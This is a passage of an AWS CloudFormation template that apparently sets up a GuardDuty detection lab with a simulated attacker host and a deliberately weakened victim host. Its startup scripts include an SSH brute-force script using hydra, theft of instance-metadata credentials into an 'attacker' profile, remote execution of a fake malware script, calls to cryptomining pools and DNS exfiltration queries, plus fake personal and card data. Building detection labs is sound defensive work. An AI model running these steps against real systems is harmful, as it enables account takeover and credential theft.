  ### Malicious Host Security Group
  MaliciousSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "malicious"]
      VpcId: !Ref VPC
      SecurityGroupIngress:
        - IpProtocol: icmp
          FromPort: "-1"
          ToPort: "-1"
          CidrIp: 0.0.0.0/0

  ### Malicious Host
  MaliciousIP:
    DependsOn:
      - GatewayAttachment
    Type: AWS::EC2::EIP
    Properties:
      InstanceId: !Ref MaliciousInstance
      Domain: vpc
  MaliciousInstance:
    Type: AWS::EC2::Instance
    Properties:
      IamInstanceProfile: !Ref MaliciousInstanceProfile
      InstanceType: t2.micro
      ImageId:
        Fn::FindInMap:
          - RegionMap
          - !Ref AWS::Region
          - "ubuntu"
      NetworkInterfaces:
        - AssociatePublicIpAddress: "false"
          DeviceIndex: "0"
          GroupSet:
            - !Ref MaliciousSecurityGroup
          SubnetId:
            Ref: MaliciousSubnet
      Tags:
        - Key: Name
          Value:
            Fn::Join:
              - ": "
              - [!Ref ResourceName, "Malicious Host"]
        - Key: Service
          Value: !Ref ResourceName
      UserData:
        Fn::Base64: !Sub
          - |
            #!/bin/bash -ex
            # Get Updates and Install Necessary Packages -- added below 4 lines to install AWS CLI v2, and blocked 'pip install awscli'. 2021-7-22 --
            curl https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip -o awscliv2.zip
            sudo apt install unzip 
            unzip awscliv2.zip
            sudo ./aws/install
            sudo apt-get update && sudo apt-get upgrade && sudo apt-get dist-upgrade
            sudo apt-get install build-essential -y
            sudo apt-get install git sshpass python-pip libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev -y
            #pip install awscli
            export PATH=$PATH:/usr/local/bin:/usr/sbin:/root/.local/bin
            echo 'export PATH=/root/.local/bin:/usr/sbin:$PATH' >> /home/ubuntu/.profile
            # Set Region
            aws configure set default.region ${Region}
            # Install thc-hydra
            mkdir /home/ubuntu/thc-hydra
            git clone https://github.com/vanhauser-thc/thc-hydra /home/ubuntu/thc-hydra
            cd /home/ubuntu/thc-hydra
            sudo /home/ubuntu/thc-hydra/configure && sudo make && sudo make install
            # Install nmap.
            sudo apt-get install -y nmap
            # Create Password List
            sudo /home/ubuntu/thc-hydra/dpl4hydra.sh root
            sudo chown ubuntu /home/ubuntu/thc-hydra/dpl4hydra_root.lst
            sudo echo "hackeduser:hackedPassword123!" >> dpl4hydra_root.lst
            # Create Targets File
            com_ip=10.0.0.15
            echo $com_ip:22 >> /home/ubuntu/targets.txt
            # Create SSH Brute Force script
            cat <<EOT >> /home/ubuntu/ssh-bruteforce.sh
            #!/bin/bash
            /usr/local/bin/hydra -C /home/ubuntu/thc-hydra/dpl4hydra_root.lst -M /home/ubuntu/targets.txt ssh -t 4
            /usr/local/bin/hydra -C /home/ubuntu/thc-hydra/dpl4hydra_root.lst -M /home/ubuntu/targets.txt ssh -t 4
            EOT
            chmod 744 /home/ubuntu/ssh-bruteforce.sh
            chown ubuntu /home/ubuntu/ssh-bruteforce.sh
            # make script to get AWS credential of Compromised Host
            cat <<EOT >> /home/ubuntu/get-credential.sh
            #!/bin/bash
            /usr/bin/sshpass -p "hackedPassword123!" scp -o StrictHostKeyChecking=no -r hackeduser@10.0.0.15:/home/hackeduser/found-credential.sh /home/ubuntu/set-credential.sh
            chmod 744 /home/ubuntu/set-credential.sh
            chown ubuntu /home/ubuntu/set-credential.sh
            EOT
            chmod 744 /home/ubuntu/get-credential.sh
            chown ubuntu /home/ubuntu/get-credential.sh
            # make script to start malware installed on Compromised Host
            cat <<EOT >> /home/ubuntu/start-malware.sh
            #!/bin/bash
            /usr/bin/sshpass -p "hackedPassword123!" ssh -o StrictHostKeyChecking=no hackeduser@10.0.0.15 ". ./i-am-malware.sh"
            EOT
            chmod 744 /home/ubuntu/start-malware.sh
            chown ubuntu /home/ubuntu/start-malware.sh
            # Start SSM Agent
            sudo systemctl enable amazon-ssm-agent
          - Region: !Ref "AWS::Region"
            Bucket:
              Fn::Join:
                - "-"
                - [
                    !Ref ResourceName,
                    !Ref "AWS::AccountId",
                    !Ref "AWS::Region",
                    "gd-threatlist",
                  ]

  ### Compromised Host IAM Role
  CompromisedRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, compromised-ec2]
      AssumeRolePolicyDocument:
        Version: 2012-10-17
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - ec2.amazonaws.com
            Action:
              - sts:AssumeRole
      Path: /
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM
      Policies:
        - PolicyName: CompromisedPolicy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - guardduty:GetDetector
                  - guardduty:ListDetectors
                  - guardduty:CreateThreatIntelSet
                  - guardduty:UpdateThreatIntelSet
                  - dynamodb:ListTables
                Resource: "*"
              - Effect: Allow
                Action:
                  - iam:PutRolePolicy
                Resource:
                  Fn::Join:
                    - ":"
                    - [
                        "arn:aws:iam:",
                        !Ref "AWS::AccountId",
                        "role/aws-service-role/guardduty.amazonaws.com/*",
                      ]
              - Effect: Allow
                Action: "s3:PutObject"
                Resource:
                  Fn::Join:
                    - ""
                    - [
                        "arn:aws:s3:::",
                        !Ref ResourceName,
                        "-",
                        !Ref "AWS::AccountId",
                        "-",
                        !Ref "AWS::Region",
                        "-",
                        "gd-threatlist",
                        "/*",
                      ]
              - Effect: Allow
                Action:
                  - ssm:PutParameter
                  - ssm:DescribeParameters
                  - ssm:GetParameters
                  - ssm:DeleteParameter
                Resource:
                  Fn::Join:
                    - ":"
                    - [
                        "arn:aws:ssm",
                        !Ref "AWS::Region",
                        !Ref "AWS::AccountId",
                        "parameter/*",
                      ]
              - Effect: Allow
                Action:
                  - ssm:DescribeParameters
                Resource: "*"
              - Effect: Allow
                Action:
                  - dynamodb:ListTables
                  - dynamodb:DescribeTable
                Resource: "*"
              - Effect: Allow
                Action:
                  - logs:PutLogEvents
                  - logs:DescribeLogStreams
                  - logs:CreateLogStream
                  - logs:CreateLogGroup
                Resource: "arn:aws:logs:*:*:*"
              - Effect: Allow
                Action:
                  - "s3:*"
                Resource:
                  Fn::Join:
                    - ""
                    - [
                        "arn:aws:s3:::",
                        !Ref ResourceName,
                        "-",
                        !Ref "AWS::AccountId",
                        "-",
                        !Ref "AWS::Region",
                        "-",
                        "data",
                        "/*",
                      ]
              - Effect: Allow
                Action:
                  - "s3:*"
                Resource:
                  Fn::Join:
                    - ""
                    - [
                        "arn:aws:s3:::",
                        !Ref ResourceName,
                        "-",
                        !Ref "AWS::AccountId",
                        "-",
                        !Ref "AWS::Region",
                        "-",
                        "data",
                      ]
              - Effect: Allow
                Action:
                  - cloudtrail:ListTrails
                  - cloudtrail:DescribeTrails
                  - cloudtrail:StopLogging
                  - cloudtrail:DeleteTrail
                  - iam:CreateUser
                  - iam:CreateAccessKey
                  - iam:AttachUserPolicy
                Resource: "*"
  CompromisedHostProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      InstanceProfileName:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "compromised-ec2-profile"]
      Path: /
      Roles:
        - !Ref CompromisedRole

  ### Compromised Host Security Group
  CompromisedSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription:
        Fn::Join:
          - "-"
          - [!Ref ResourceName, "compromised"]
      VpcId: !Ref VPC
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: "22"
          ToPort: "22"
          CidrIp: 10.0.0.0/16

  ### Compromised Host
  CompromisedHost:
    Type: AWS::EC2::Instance
    Properties:
      InstanceType: t2.micro
      IamInstanceProfile: !Ref CompromisedHostProfile
      ImageId:
        Fn::FindInMap:
          - RegionMap
          - !Ref "AWS::Region"
          - "aznlinux"
      NetworkInterfaces:
        - AssociatePublicIpAddress: true
          DeviceIndex: 0
          GroupSet:
            - !Ref CompromisedSecurityGroup
          SubnetId:
            Ref: Subnet
          PrivateIpAddress: "10.0.0.15"
      Tags:
        - Key: Name
          Value:
            Fn::Join:
              - ": "
              - [!Ref ResourceName, "Compromised Host"]
        - Key: Service
          Value: !Ref ResourceName
      UserData:
        Fn::Base64: !Sub
          - |
            #!/bin/bash
            # Set Region
            aws configure set default.region ${Region}
            # Set Credential Variables
            access_key_id=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${Role} | grep AccessKeyId | cut -d':' -f2 | sed 's/[^0-9A-Z]*//g'`
            secret_key=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${Role} | grep SecretAccessKey | cut -d':' -f2 | sed 's/[^0-9A-Za-z/+=]*//g'`
            token=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${Role} | grep Token | cut -d':' -f2 | sed 's/[^0-9A-Za-z/+=]*//g'`
            expiration=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${Role} | grep Expiration | cut -d':' -f2 | sed 's/[^0-9A-Za-z/+=]*//g'`
            compromisedip=`curl http://169.254.169.254/latest/meta-data/local-ipv4`
            # Install AWS Inspector Agent
            wget https://inspector-agent.amazonaws.com/linux/latest/install
            sudo bash install
            # Install CloudWatch Logs Agent
            sudo yum install awslogs -y
            # Set CloudWatch Logs Agent Region
            cat <<EOT >> /tmp/awscli.conf
            [plugins]
            cwlogs = cwlogs
            [default]
            region = ${Region}
            EOT
            sudo cp /tmp/awscli.conf /etc/awslogs/
            # Set CloudWatch Logs Agent Config
            cat <<EOT >> /tmp/awslogs.conf
            [general]
            state_file = /var/lib/awslogs/agent-state
            [/var/log/secure]
            file = /var/log/secure
            log_group_name = /${ResourceName}/var/log/secure
            log_stream_name = {instance_id}/ssh
            datetime_format = %d/%b/%Y:%H:%M:%S
            EOT
            sudo cp /tmp/awslogs.conf /etc/awslogs/
            # Start CloudWatch Log Agent
            sudo systemctl start awslogsd
            # Start SSM Agent
            sudo systemctl start amazon-ssm-agent
            # Modify Instance Configurations
            sudo sed 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config > temp.txt
            mv -f temp.txt /etc/ssh/sshd_config
            sudo systemctl restart sshd
            # Install and start Apache
            sudo yum install httpd -y
            sudo systemctl start httpd
            sudo systemctl restart rsyslog
            # Create Sample User
            sudo useradd -u 12345 -g users -d /home/hackeduser -s /bin/bash -p $(echo hackedPassword123! | openssl passwd -1 -stdin) hackeduser
            # Create Fake profile Data Files
            cat <<EOT >> /tmp/profile-data.csv
            SSN,gender,birthdate,maiden name,last name,first name,address,city,state,zip,phone,email,cc_type,CCN,cc_cvc,cc_expiredate
            172-32-1176,m,4/21/1958,Smith,White,Johnson,10932 Bigge Rd,Menlo Park,CA,94025,408 496-7223,jwhite@domain.com,m,5270-4267-6450-5516,123,2010/06/25
            514-14-8905,f,12/22/1944,Amaker,Borden,Ashley,4469 Sherman Street,Goff,KS,66428,785-939-6046,aborden@domain.com,m,5370-4638-8881-3020,713,2011/02/01
            213-46-8915,f,4/21/1958,Pinson,Green,Marjorie,309 63rd St. #411,Oakland,CA,94618,415 986-7020,mgreen@domain.com,v,4916-9766-5240-6147,258,2009/02/25
            524-02-7657,m,3/25/1962,Hall,Munsch,Jerome,2183 Roy Alley,Centennial,CO,80112,303-901-6123,jmunsch@domain.com,m,5180-3807-3679-8221,612,2010/03/01
            489-36-8350,m,1964/09/06,Porter,Aragon,Robert,3181 White Oak Drive,Kansas City,MO,66215,816-645-6936,raragon@domain.com,v,4929-3813-3266-4295,911,2011/12/01
            514-30-2668,f,1986/05/27,Nicholson,Russell,Jacki,3097 Better Street,Kansas City,MO,66215,913-227-6106,jrussell@domain.com,a,345389698201044,232,2010/01/01
            EOT
            # Upload profile data to S3
            sleep 5
            aws s3 cp /tmp/profile-data.csv s3://${Bucket}/profile-data.csv
            # Create Fake employee Data Files
            cat <<EOT >> /tmp/employee-data.txt
            # Sample Report - No identification of actual persons or places is
            # intended or should be inferred
            74323 Julie Field
            Lake Joshuamouth, OR 30055-3905
            1-196-191-4438x974
            53001 Paul Union
            New John, HI 94740
            American Express
            Amanda Wells
            5135725008183484 09/26
            CVE: 550
            354-70-6172
            242 George Plaza
            East Lawrencefurt, VA 37287-7620
            GB73WAUS0628038988364
            587 Silva Village
            Pearsonburgh, NM 11616-7231
            LDNM1948227117807
            American Express
            Brett Garza
            347965534580275 05/20
            CID: 4758
            EOT
            # Upload employee data to S3
            sleep 5
            aws s3 cp /tmp/employee-data.txt s3://${Bucket}/employee-data.txt
            # Create Fake Config File
            echo 'aws_access_key_id =' $access_key_id >> /tmp/config.py
            echo 'aws_secret_access_key =' $secret_key >> /tmp/config.py
            echo 'github_key = 8a2aa88896371b444666f641aa65392222dd3333' >> /tmp/config.py
            # Upload config file to S3
            sleep 5
            aws s3 cp /tmp/config.py s3://${Bucket}/config.py
            # Create Fake memo File
            cat <<EOT >> /tmp/memo.pst
            Proprietary Information
            Do not share with any other employee.
            EOT
            # Upload employee memo to S3
            sleep 5
            aws s3 cp /tmp/memo.pst s3://${Bucket}/memo.pst
            # Create Fake /etc/passwd
            cat <<EOT >> /tmp/passwd.txt
            blackwidow:x:10:100::/home/blackwidow:/bin/bash
            thor:x:11:100::/home/thor:/bin/bash
            ironman:x:12:100::/home/ironman:/bin/bash
            EOT
            # Upload passwd file to S3
            sleep 5
            aws s3 cp /tmp/passwd.txt s3://${Bucket}/passwd.txt
            # collect AWS credential
            cat <<EOT >> /home/hackeduser/found-credential.sh
            #!/bin/bash
            /usr/local/bin/aws configure set profile.attacker.region ${Region}
            /usr/local/bin/aws configure set profile.attacker.aws_access_key_id $access_key_id
            /usr/local/bin/aws configure set profile.attacker.aws_secret_access_key $secret_key
            /usr/local/bin/aws configure set profile.attacker.aws_session_token $token
            EOT
            chown hackeduser /home/hackeduser/found-credential.sh
            # Threatlist Variables
            # uuid=$(uuidgen)
            # list="gd-threat-list-example-$uuid.txt"
            list="gd-threat-list-example.txt"
            # Create Threatlist
            cat <<EOT >> /tmp/$list
            10.0.1.0/24
            EOT
            echo ${MaliciousIP} >> /tmp/$list
            # Upload list to S3
            aws s3 cp /tmp/$list s3://${BucketThreatList}/$list
            sleep 5
            # Create GuardDuty Threat List
            id=`aws guardduty list-detectors --query 'DetectorIds[0]' --output text`
            aws guardduty create-threat-intel-set --activate --detector-id $id --format TXT --location https://s3.amazonaws.com/${BucketThreatList}/$list --name Custom-Threat-List
            # Create queries.txt File for generate enough unusual DNS activity to trigger the DNS Exfiltration finding.
            cat <<EOT >> /tmp/queries.txt
            0ubb0EnPJyobGCgvGSgK36CdGWkyY87aklIyGzJW3GuhS1TzzuqXaSiaPvenqJ.3gbIyxfIywjG3UHqwOIsjYrMzKDapb3doq.loganding123test.com
            0ycb1EnPJyobGCgvGmgK337dGWkAY4maklIyGzJW3GuhS1Tzz-zR0DHSAbbHwh.42dWmdiYmhf-cc0NMLluJGaXxSq5a.loganding123test.com
            02db2EnPJyobGCgvGIg-357dGWkzsDwaffXmqmX5CWcb1BEUSAm05UW-neGYRf.WavmtjYCde-sk0N1PiuhHZSOwUKz5dRx4cAb1thM9Mz5rKwgcQejPxMLz.tQgPwcAsnElGbCRrYZ.loganding123test.com
            0aeb3EnPJyobGCgvGmgK347dGWkAY5maklIyGzJW3GuhS1TzzlzR0DJCBbbHwh.9vLygbK4obIAja5Y6qLQqWaXtKq5a.loganding123test.com
            0afb4EnPJyobGCgvGmgK347dGWkAY5maklIyGzJW3GuhS1TzzlzR0DJCBbbHwh.9vLygbK4obIAja5Y6qLQqWaXtKq5a.loganding123test.com
            0ewb7vO1QklDGy8H1cm9bhDjtnXa14q91EfOYsPntMjUuCoOmSQaFoXyjzDamH.8XkkwUfqDBI4j7nQ2WdzS1dsq.loganding123test.com
            0mbbaEnPJyobGCgvGmgM35mdGWkyY_7aklIyGzJW3GuhS1TzfjPR0ZVWnaGX6D.LXKygbK4obIAjd5YRqLAtiaUTKq5a.loganding123test.com
            0qbbbEnPJyobGCgvGmgM34mdGWkyY67aklIyGzJW3GuhS1TzfjPR0RPynaGXNT.QuWmdaYCNaXneHZmM0j1GqaTjmp5q.loganding123test.com
            0ubbcEnPJyobGCgvGsgM36mdGWkAsE1affXmqmX5CWcb1BESIe705v7SgcyyZY.Y7YmdaYCNaXneHRm10j1StaWkddjGCKfzBuwdQT0BNYAWoJWhm_X0Npop.2NNHcZwFNS2szzIW0vT7WzWaaaqYyGQa.loganding123test.com
            0ycbdEnPJyobGCgvGCgI33SdGWkyY3CaklIyGzJW3GuhS1TzfkzR0RPyBbbJol.dfHygbK4obIAjdoznQs8iwrKzvlS85zhYqpai2beTO.loganding123test.com
            02dbeEnPJyobGCgvGmgM35SdGWkyY97aklIyGzJW3GuhS1TzfkzR0BOenaGX2n.20MygbK4obIAjbryDQsVb3aXteq5a.loganding123test.com
            0adbfEnPJyobGCgvGCgM34SdGWkBsDwaffXmqmX5CWcb1BEUIfm05T7agcyA6k.2yYmdaYCNaXnmIOmM0jxS_aWmddjCOabWdpkbdy.loganding123test.com
            0eebgEnObBact_WaacabfaabOGnDaaeagjgxaQaOcWkGkaCgqabBwTAj-kx8gu.yayan0-bWaaaqeicGcahiKcTgquaaaaigDVCtNU-q5U-hRGKdYUxGRoyr.6HMB0TTCCInpu0FN7L1lTNLnkajIlFwni53agRZKR9kjW.loganding123test.com
            0igbhEnObFacd_Waacabfaab3GnHaaeagjftaQaOcWkGkaCgqabBwTAkOkx8gH.yayan259qaaaqeicGcahmycTgrpaaaamfPJqgVUMRWlvbiYcCMhdsLGJB.I-qNiKUunIW9Wrh2CfztQMUFeSgr4QY0oFOX27ejXhOyByOzWAsFWMuF6.lBIqxLI5g.loganding123test.com
            0ycbtEnPJyobGCbvGmgM337dGWkBsCMaffXmqmX5CWcb1BEVYlzR06RunaGX2v.6GXmdaYCNaXnmGzm10jVqGaX6Kq5a.loganding123test.com
            0ydbuEnPJyobGCbvGmgM337dGWkBsCMaffXmqmX5CWcb1BEVYlzR06RunaGX2v.6GXmdaYCNaXnmGzm10jVqGaX6Kq5a.loganding123test.com
            02ebvEnPJyobGCbvGmgM357dGWkBsFgaffXmqmX5CWcb1BEVYlzR0xHmBbbJEl.EvIygbK4obIAjdZynQsEHKaX2-q5a.loganding123test.com
            0aebwEnPJyobGCbvGmgM347dGWkBsDgaffXmqmX5CWcb1BEVYlzR0xL7BbbJEl.zNaWmdiYmhf-caxZlqL8r3a07mr4W.loganding123test.com
            0eebxEnObxacJ_WaacabfeabyGn8aaeagjf2aQaOcWkGkaCgqabBwTAE-kx8k8.yayao6BEaaaaqeicGcaiAWcTgxEaaaaem7apaXCiolzo9dhkXJQkDFdoy.yYfDV4wJ0js5Gan0pJyoiGTa.loganding123test.com
            0ifbyEnObxacJ_WaacabfeabyGobaaeagjfZaQaOcWkGkaCgqabBwTAFykx8k8.yayao5CdWaaaqeicGcaiCycTgxEaaaaehl3NSXKyF09UFrgoZuHMu39C2.ZYy7BbRO0PXJLOBIv7HiCISG.loganding123test.com
            0mgbzEnPJyobGCbvGmgL35mdGWkzsF1affXmqmX5CWcb1BEVYp4R02PinaGZV4.KOXmdaYCNaXncIEznQswqqaX3Kq5a.loganding123test.com
            0qgb0EnObxacJ_WaacabfeabyGojaaeagjfRaQaOcWkGkaCgqabBwTAF7kx8lg.yayao4igqaaaqeicGcaiEucTgLYaaaaelN-2PQ99lB557ctcdUmOipjHI.PnLu0p95gr8TVC34ZEFEeLRW.loganding123test.com
            0uab1EnPJyobGCbvGmgL36mdGWkzsE1affXmqmX5CWcb1BESkbC05B8Sgayz2C.1yXmdaYCNaXncG9zDQs1qCaVt7q5a.loganding123test.com
            0ybb2EnPJyobGCbvGCgH33SdGWkzsCgaffXmqmX5CWcb1BESkbC05B8SnaGZ_A.9WygbGzoBGygPruMlzK8JeYSNib4rkbEcOaGUus1G.loganding123test.com
            0ycb3EnPJyobGCbvGCgH33SdGWkzsCgaffXmqmX5CWcb1BESkbC05B8SnaGZ_A.9WygbGzoBGygPruMlzK8JeYSNib4rkbEcOaGUus1G.loganding123test.com
            02cb4EnPJyobGCbvGCgH35SdGWkAsF1affXmqmX5CWcb1BESkbC05B8SnaOWc0.w7ygbGzoBGygPqCMBzK8JeYSNib4rkbEcCaFeus1G.loganding123test.com
            0acb5EnPJyobGCbvGCgH34SdGWkAsD1affXmqmX5CWcb1BESkbC05B8SnaOYk0.vemdiYmhfWmduPXtfSY9XGzwBMaCOMA8t5YahaLeDS.loganding123test.com
            0edb6EnPJyobGCbvGmgL36SdGWkzsEwaffXmqmX5CWcb1BESkbC05h8KgauBfw.rWmdiYmhfWmduPlMBzK9qiaOXSo5G.loganding123test.com
            0idb7EnPJyobGCbvGIgH33CdGWkysCMaffXmqmX5CWcb1BESkbC05h8Kgcuzf4.WagbKzgdI5gbS0cPI0zVGWmdaixJerYQXBjQuY7kBFoz2Fd2mnNCU8U7x.MW193bE_fTGXWJalDHhRy.loganding123test.com
            0meb8EnPJyobGCbvGmgL35CdGWkzsFMaffXmqmX5CWcb1BESkf705h7CgauBf6.LCmdiYmhfWmdzOtMlyuwGaaTACp5q.loganding123test.com
            0qeb9EnPJyobGCbvGIgH34CdGWkysDgaffXmqmX5CWcb1BESkf705h7CgcuBfv.-KmdiYmhfWmdzPZMlyuwJaWmaIKcpVMmxp1p25G-pHiwVZ3_IDEJ-6T5v.D5inw36FwHNlVtaEurilq.loganding123test.com
            0ufbaEnPJyobGCbvGmgL36CdGWkzsEMaffXmqmX5CWcb1BEUkdm05N8qgauBfB.IugbKzgdI5gbS-ltfSkkWcX7W_P.loganding123test.com
            0yfbbEnObxacJ_WaacabfeabyGoXaaeagjfdaQaOcWkGkaCgqabBwTAHOkx8mz.yayasgDLWaaaqeicGcakDecThf3aaaaemFo78W7CdNSEgXMFDUSYUfjKp.3D2SmLh5jGnKkJBw3RstqHSW.loganding123test.com
            02gbcEnObxacJ_WaacabfeabyGo0aaeagje_aQaOcWkGkaCgqabBwTAImkx8mz.yayaseR2aaaaqeicGcakFicThf3aaaaeaPQBLA8G2iEORxrZ4pv_mjjUU.zA7irr2enVMOQi38FVnl3JSq.loganding123test.com
            0ahbdEnPJyobGCbvGmgL347dGWkzsDgaffXmqmX5CWcb1BEUkdzR0pP-naOYkx.tOmdiYmhfWmdvPstfSkDWaaUt7p5q.loganding123test.com
            0ehbeEnPJyobGCbvGmgL367dGWkzsEgaffXmqmX5CWcb1BEUkdzR0pN7BbbGvo.6SzgbGzoBGygRs-MByuxGeaYlSq5a.loganding123test.com
            0ihbfEnObxacJ_WaacabfeabyGpbaaeagjeZaQaOcWkGkaCgqabBwTAIWkx8m_.yayaseLRaaaaqeicGcakTycThhuaaaaed49Sp3gEEVO3XQugDYGCodCaq.BuVzc45VUqqHu5AEOcy8qISG.loganding123test.com
            0mabgEnPJyobGCbvGmgN35mdGWkAsF1affXmqmX5CWcb1BEUkk4R0VOOnaOYk6.zSzgbGzoBGygRq9m1-PMGmaWd7q5a.loganding123test.com
            0qabhEnObxacJ_WaacabfeabyGpjaaeagjeRaQaOcWkGkaCgqabBwTAJukx8ni.yayasgjFGaaaqeicGcakXecThkCaaaaej5I6VUSHg9ovxEjsnJ7-AJmdU.2bKjqDbv-uzwZpzDfYnf-HSW.loganding123test.com
            0ubbiEnPJyobGCbvGmgN36mdGWkAsE1affXmqmX5CWcb1BEUkh4R0VQ3naOYkB.A7ygbGzoBGygRrnMlyu2qeaXNCq5a.loganding123test.com
            0ybbjEnObxacJ_WaacabfeabyGpraaeagjeJaQaOcWkGkaCgqabBwTAJ3kx8nr.yayash9ZGaaaqeicGcak-acThlCaaaaebFnGpFNG62rWUtdXbglLNoPMN.ZEmra9iMYAOkwdM_sjFmGJSq.loganding123test.com
            02cbkEnPJyobGCbvGmgN35SdGWkAsFwaffXmqmX5CWcb1BETkgC0527WgauBfn.IugbKzgdI5gbU0IPI2fSGcO1W6Q.loganding123test.com
            0acblEnObxacJ_WaacabfeabyGpzaaeagjeBaQaOcWkGkaCgqabBwTAKCkx8nA.yayashEcqaaaqeicGcak9CcThmDaaaaee0qoybX78rl_FcVZ9sUQP1S0O.gyq6R9qigofOv8mHEBh8WHSW.loganding123test.com
            0edbmEnPJyobGCbvGmgN36SdGWkAsEwaffXmqmX5CWcb1BETkb705283gauBfL.P-mdiYmhfWmdtPStfUkvWmaTOSp5q.loganding123test.com
            EOT
            # Create start-malware.sh File which is trying to access to BitCoin domain, and DNS Exfiltration.
            cat <<EOT >> /home/hackeduser/i-am-malware.sh
            #!/bin/bash
            /usr/bin/curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &
            /usr/bin/curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &
            /usr/bin/dig -f /tmp/queries.txt > /dev/null &
            EOT
            chown hackeduser /home/hackeduser/i-am-malware.sh
            # Set Ping cron Job
            # echo "* * * * * ping -c 6 -i 10 ${MaliciousIP}" | tee -a /var/spool/cron/ec2-user
          - Role: !Ref CompromisedRole
            Region: !Ref "AWS::Region"
            Bucket:
              Fn::Join:
                - "-"
                - [
                    !Ref ResourceName,
                    !Ref "AWS::AccountId",
                    !Ref "AWS::Region",
                    "data",
                  ]
            BucketThreatList:
              Fn::Join:
                - "-"
                - [
                    !Ref ResourceName,
                    !Ref "AWS::AccountId",
                    !Ref "AWS::Region",
                    "gd-threatlist",
                  ]
            BucketLogs:
              Fn::Join:
                - "-"
                - [
                    !Ref ResourceName,
                    !Ref "AWS::AccountId",
                    !Ref "AWS::Region",
                    "logs",
                  ]
            ResourceName: !Ref ResourceName

Outputs: {}
```
